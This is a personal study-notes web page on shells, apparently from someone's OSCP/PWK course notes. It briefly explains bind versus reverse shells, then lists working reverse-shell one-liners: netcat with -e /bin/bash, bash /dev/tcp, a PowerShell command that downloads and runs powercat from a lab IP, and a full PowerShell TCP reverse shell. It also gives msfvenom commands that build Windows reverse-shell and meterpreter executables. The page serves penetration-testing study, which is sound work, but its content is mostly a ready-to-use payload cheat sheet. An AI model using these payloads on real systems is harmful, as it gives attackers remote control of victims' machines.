<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Shells | Omar2535</title>
    <meta name="generator" content="VuePress 1.9.10">
    
    <meta name="description" content="Notes">
    
    <link rel="preload" href="/assets/css/0.styles.d9d6ac5f.css" as="style"><link rel="preload" href="/assets/js/app.5c7e2713.js" as="script"><link rel="preload" href="/assets/js/2.9a4c6a37.js" as="script"><link rel="preload" href="/assets/js/1.25194066.js" as="script"><link rel="preload" href="/assets/js/59.b75ba6bd.js" as="script"><link rel="prefetch" href="/assets/js/10.a170acdf.js"><link rel="prefetch" href="/assets/js/100.24f5678a.js"><link rel="prefetch" href="/assets/js/101.36394ea1.js"><link rel="prefetch" href="/assets/js/102.381dff3f.js"><link rel="prefetch" href="/assets/js/103.8ee1078b.js"><link rel="prefetch" href="/assets/js/104.fd7a195d.js"><link rel="prefetch" href="/assets/js/105.77c1262a.js"><link rel="prefetch" href="/assets/js/11.c0feb069.js"><link rel="prefetch" href="/assets/js/12.fb0e6d64.js"><link rel="prefetch" href="/assets/js/13.3dcb41cd.js"><link rel="prefetch" href="/assets/js/14.efc2c885.js"><link rel="prefetch" href="/assets/js/15.8a5e60c8.js"><link rel="prefetch" href="/assets/js/16.f4edd56b.js"><link rel="prefetch" href="/assets/js/17.f86cca87.js"><link rel="prefetch" href="/assets/js/18.da042ca7.js"><link rel="prefetch" href="/assets/js/19.16dbd463.js"><link rel="prefetch" href="/assets/js/20.89143cc3.js"><link rel="prefetch" href="/assets/js/21.2370e981.js"><link rel="prefetch" href="/assets/js/22.4821847d.js"><link rel="prefetch" href="/assets/js/23.b9530bc3.js"><link rel="prefetch" href="/assets/js/24.63874f6c.js"><link rel="prefetch" href="/assets/js/25.6396c6e1.js"><link rel="prefetch" href="/assets/js/26.5ca76fe1.js"><link rel="prefetch" href="/assets/js/27.fceb214e.js"><link rel="prefetch" href="/assets/js/28.aed317fa.js"><link rel="prefetch" href="/assets/js/29.064b8783.js"><link rel="prefetch" href="/assets/js/3.5cf116a2.js"><link rel="prefetch" href="/assets/js/30.2c07e34d.js"><link rel="prefetch" href="/assets/js/31.6badab32.js"><link rel="prefetch" href="/assets/js/32.a833aed2.js"><link rel="prefetch" href="/assets/js/33.09a8bd6e.js"><link rel="prefetch" href="/assets/js/34.71fc7d47.js"><link rel="prefetch" href="/assets/js/35.6b6a7693.js"><link rel="prefetch" href="/assets/js/36.b1b3864f.js"><link rel="prefetch" href="/assets/js/37.66538f93.js"><link rel="prefetch" href="/assets/js/38.c79a72cc.js"><link rel="prefetch" href="/assets/js/39.34d9323e.js"><link rel="prefetch" href="/assets/js/4.5cf04776.js"><link rel="prefetch" href="/assets/js/40.51025031.js"><link rel="prefetch" href="/assets/js/41.e7d0d9ca.js"><link rel="prefetch" href="/assets/js/42.f33028d2.js"><link rel="prefetch" href="/assets/js/43.3c1af4f5.js"><link rel="prefetch" href="/assets/js/44.fec6fa77.js"><link rel="prefetch" href="/assets/js/45.e3f2e591.js"><link rel="prefetch" href="/assets/js/46.61ee225e.js"><link rel="prefetch" href="/assets/js/47.a46b9e2d.js"><link rel="prefetch" href="/assets/js/48.2d660e33.js"><link rel="prefetch" href="/assets/js/49.6dfac500.js"><link rel="prefetch" href="/assets/js/5.83d8d9cc.js"><link rel="prefetch" href="/assets/js/50.46cab3c1.js"><link rel="prefetch" href="/assets/js/51.54f0c1d5.js"><link rel="prefetch" href="/assets/js/52.444754f4.js"><link rel="prefetch" href="/assets/js/53.000c5671.js"><link rel="prefetch" href="/assets/js/54.63a99a62.js"><link rel="prefetch" href="/assets/js/55.57a325d0.js"><link rel="prefetch" href="/assets/js/56.4a4fa2e2.js"><link rel="prefetch" href="/assets/js/57.21ba8032.js"><link rel="prefetch" href="/assets/js/58.835150ce.js"><link rel="prefetch" href="/assets/js/6.2aebede8.js"><link rel="prefetch" href="/assets/js/60.fce32a87.js"><link rel="prefetch" href="/assets/js/61.43bda37e.js"><link rel="prefetch" href="/assets/js/62.4223514c.js"><link rel="prefetch" href="/assets/js/63.532acbef.js"><link rel="prefetch" href="/assets/js/64.04d178ad.js"><link rel="prefetch" href="/assets/js/65.8871c65a.js"><link rel="prefetch" href="/assets/js/66.13ba9899.js"><link rel="prefetch" href="/assets/js/67.a7d33675.js"><link rel="prefetch" href="/assets/js/68.db280e75.js"><link rel="prefetch" href="/assets/js/69.107ef3e7.js"><link rel="prefetch" href="/assets/js/7.e556b776.js"><link rel="prefetch" href="/assets/js/70.ae88b738.js"><link rel="prefetch" href="/assets/js/71.a8650e94.js"><link rel="prefetch" href="/assets/js/72.e62d7e5c.js"><link rel="prefetch" href="/assets/js/73.6215bf4a.js"><link rel="prefetch" href="/assets/js/74.e288deda.js"><link rel="prefetch" href="/assets/js/75.ec8117cf.js"><link rel="prefetch" href="/assets/js/76.395483d0.js"><link rel="prefetch" href="/assets/js/77.117ff4c1.js"><link rel="prefetch" href="/assets/js/78.45cf0a72.js"><link rel="prefetch" href="/assets/js/79.c9c33f3b.js"><link rel="prefetch" href="/assets/js/80.9b884e54.js"><link rel="prefetch" href="/assets/js/81.bca310d4.js"><link rel="prefetch" href="/assets/js/82.3b1564a7.js"><link rel="prefetch" href="/assets/js/83.96aea01e.js"><link rel="prefetch" href="/assets/js/84.f31d2af5.js"><link rel="prefetch" href="/assets/js/85.2e972253.js"><link rel="prefetch" href="/assets/js/86.fd9cbe59.js"><link rel="prefetch" href="/assets/js/87.5e8a353d.js"><link rel="prefetch" href="/assets/js/88.1fdd1aac.js"><link rel="prefetch" href="/assets/js/89.51400c15.js"><link rel="prefetch" href="/assets/js/90.254adeba.js"><link rel="prefetch" href="/assets/js/91.02b2b148.js"><link rel="prefetch" href="/assets/js/92.af67168d.js"><link rel="prefetch" href="/assets/js/93.0b3caf8a.js"><link rel="prefetch" href="/assets/js/94.6fc6b60b.js"><link rel="prefetch" href="/assets/js/95.d59f8c6b.js"><link rel="prefetch" href="/assets/js/96.d94d45cd.js"><link rel="prefetch" href="/assets/js/97.ebee2487.js"><link rel="prefetch" href="/assets/js/98.4c94c079.js"><link rel="prefetch" href="/assets/js/99.c628bd76.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.0115b510.js">
    <link rel="stylesheet" href="/assets/css/0.styles.d9d6ac5f.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">Omar2535</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog/" class="nav-link">
  Blog
</a></div><div class="nav-item"><a href="/misc/" class="nav-link router-link-active">
  Misc
</a></div><div class="nav-item"><a href="/about/" class="nav-link">
  About me
</a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/misc/Accomplishments/" class="sidebar-link">Accomplishments</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Certs/" class="sidebar-heading clickable"><span>Certs</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Courses/" class="sidebar-heading clickable router-link-active open"><span>Courses</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/CPSC310/" class="sidebar-heading clickable"><span>CPSC310</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS203/" class="sidebar-heading clickable"><span>PHYS203</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS216/" class="sidebar-heading clickable"><span>PHYS216</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PHYS304/" class="sidebar-heading clickable"><span>PHYS304</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><a href="/misc/Courses/PWK/" class="sidebar-heading clickable router-link-active open"><span>PWK</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/misc/Courses/PWK/buffer_overflow.html" class="sidebar-link">Buffer overflows</a></li><li><a href="/misc/Courses/PWK/course_notes.html" class="sidebar-link">OSCP Notes</a></li><li><a href="/misc/Courses/PWK/linux_privesc.html" class="sidebar-link">Linux privilege escalation</a></li><li><a href="/misc/Courses/PWK/shells.html" aria-current="page" class="active sidebar-link">Shells</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/shells.html#bind-shell-vs-reverse-shell" class="sidebar-link">Bind shell vs reverse shell</a></li><li class="sidebar-sub-header"><a href="/misc/Courses/PWK/shells.html#generating-shell-payloads" class="sidebar-link">Generating shell payloads</a></li></ul></li><li><a href="/misc/Courses/PWK/sql_injection.html" class="sidebar-link">SQL injection</a></li><li><a href="/misc/Courses/PWK/windows_privesc.html" class="sidebar-link">Windows privilege escalation</a></li><li><a href="/misc/Courses/PWK/wordpress.html" class="sidebar-link">Wordpress</a></li></ul></section></li><li><a href="/misc/Courses/practical-ethical-hacking.html" class="sidebar-link">Practical ethical hacking</a></li></ul></section></li><li><a href="/misc/Guides/" class="sidebar-link">Guides</a></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Hackthebox/" class="sidebar-heading clickable"><span>Hackthebox</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Root-me/" class="sidebar-heading clickable"><span>Root-me</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Tryhackme/" class="sidebar-heading clickable"><span>Tryhackme</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/misc/Writeups/" class="sidebar-heading clickable"><span>Writeups</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="shells"><a href="#shells" class="header-anchor">#</a> Shells</h1> <p>This section is all about shells</p> <h2 id="bind-shell-vs-reverse-shell"><a href="#bind-shell-vs-reverse-shell" class="header-anchor">#</a> Bind shell vs reverse shell</h2> <h3 id="bind-shell"><a href="#bind-shell" class="header-anchor">#</a> Bind shell</h3> <p>Basically, we are opening a port with our shell for other people to execute</p> <ul><li>Client computer starts up a listening session with shell executing on that port</li> <li>Connector just connects to the listening port that has shell already running</li></ul> <h3 id="reverse-shell"><a href="#reverse-shell" class="header-anchor">#</a> Reverse shell</h3> <p>Basically, we are sending our own shell over to the operator</p> <ul><li>Operator listens on a port</li> <li>Client computer connects to the listening port on the operator with the client's own shell</li> <li>Operator now has control of clients shell</li></ul> <h4 id="netcat-reverse-shell"><a href="#netcat-reverse-shell" class="header-anchor">#</a> Netcat reverse shell</h4> <div class="language-sh extra-class"><pre class="language-sh"><code><span class="token function">nc</span> <span class="token operator">&lt;</span>listening_host<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>listening_port<span class="token operator">&gt;</span> <span class="token parameter variable">-e</span> /bin/bash
</code></pre></div><h4 id="tcp-revsrse-shell"><a href="#tcp-revsrse-shell" class="header-anchor">#</a> TCP revsrse shell</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>/bin/bash <span class="token parameter variable">-i</span> <span class="token operator">&gt;</span> /dev/tcp/<span class="token operator">&lt;</span>attacker_ip<span class="token operator">&gt;</span>/<span class="token operator">&lt;</span>port<span class="token operator">&gt;</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><h4 id="powercat-reverse-shell-example"><a href="#powercat-reverse-shell-example" class="header-anchor">#</a> Powercat reverse shell example</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>powershell <span class="token parameter variable">-c</span> <span class="token string">&quot;IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd&quot;</span>
</code></pre></div><h4 id="powershell-reverse-shell"><a href="#powershell-reverse-shell" class="header-anchor">#</a> Powershell reverse shell</h4> <div class="language-sh extra-class"><pre class="language-sh"><code>powershell <span class="token parameter variable">-nop</span> <span class="token parameter variable">-c</span> <span class="token string">&quot;<span class="token variable">$client</span> = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);<span class="token variable">$stream</span> = <span class="token variable">$client</span>.GetStream();[byte[]]<span class="token variable">$bytes</span> = 0..65535|%{0};while<span class="token variable"><span class="token punctuation">((</span>$i <span class="token operator">=</span> $stream.Read<span class="token punctuation">(</span>$bytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $bytes.Length<span class="token punctuation">))</span></span> -ne 0){;<span class="token variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="token variable">$bytes</span>,0, <span class="token variable">$i</span>);<span class="token variable">$sendback</span> = (iex <span class="token variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="token variable">$sendback2</span> = <span class="token variable">$sendback</span> + 'PS ' + (pwd).Path + '&gt; ';<span class="token variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="token variable">$sendback2</span>);<span class="token variable">$stream</span>.Write(<span class="token variable">$sendbyte</span>,0,<span class="token variable">$sendbyte</span>.Length);<span class="token variable">$stream</span>.Flush()};<span class="token variable">$client</span>.Close()&quot;</span>
</code></pre></div><h2 id="generating-shell-payloads"><a href="#generating-shell-payloads" class="header-anchor">#</a> Generating shell payloads</h2> <h3 id="stageless-payload-catchable-with-netcat"><a href="#stageless-payload-catchable-with-netcat" class="header-anchor">#</a> Stageless payload (catchable with netcat)</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.119.194 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">80</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> shell.exe
</code></pre></div><h3 id="staged-payloads-caught-with-meterpreter-or-other-programs"><a href="#staged-payloads-caught-with-meterpreter-or-other-programs" class="header-anchor">#</a> Staged payloads (caught with meterpreter or other programs)</h3> <div class="language-sh extra-class"><pre class="language-sh"><code>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.11</span>.0.4 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> binary.exe
</code></pre></div></div> <footer class="page-edit"><!----> <!----></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/misc/Courses/PWK/linux_privesc.html" class="prev">
        Linux privilege escalation
      </a></span> <span class="next"><a href="/misc/Courses/PWK/sql_injection.html">
        SQL injection
      </a>
      →
    </span></p></div> </main></div><div class="global-ui"><!----><!----></div></div>
    <script src="/assets/js/app.5c7e2713.js" defer></script><script src="/assets/js/2.9a4c6a37.js" defer></script><script src="/assets/js/1.25194066.js" defer></script><script src="/assets/js/59.b75ba6bd.js" defer></script>
  </body>
</html>
